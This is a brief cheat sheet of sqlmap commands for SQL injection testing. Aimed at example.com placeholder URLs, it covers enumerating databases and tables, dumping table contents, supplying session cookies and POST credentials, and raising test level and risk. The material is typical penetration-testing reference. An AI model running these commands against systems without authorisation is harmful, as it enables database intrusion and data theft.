# SQLMap

|  |  |
|---|---|
| sqlmap -u "[http://example.com/page.php?id=1&name=test&age=25](http://example.com/page.php?id=1&name=test&age=25)" | SQLMap will automatically attempt to test each parameter (`id`, `name`, `age`) for vulnerabilities. |
| sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" --dbs | List the Available Databases |
| sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" -D *dbName* --tables | Select a Specific Database and list tables |
| sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" -D dbName -T tableName --dump | Dump Data from a Table |
| --cookie="cookie data” | If login is required, include the session cookie. |
| sqlmap -u "[http://example.com/login.php](http://example.com/login.php)" --data="username=admin&password=1234" | you can specify the POST data using the `--data` flag. |
| `--level=5 --risk=3` | To perform more in-depth testing on parameters with more risk. |
| `-v`  | Flag for verbosity.If you want to see more detailed information on which parameters are being tested and how |
| `--batch` | Automatically answer prompts, useful for automated testing. |

Vulnerability might be (in the URL parameters, POST data, or even headers)

`sqlmap -u "`[`http://example.com/page.php?id=1`](http://example.com/page.php?id=1)`" --data="username=admin&password=1234" --cookie="PHPSESSID=abc123" --level=5 --risk=3`
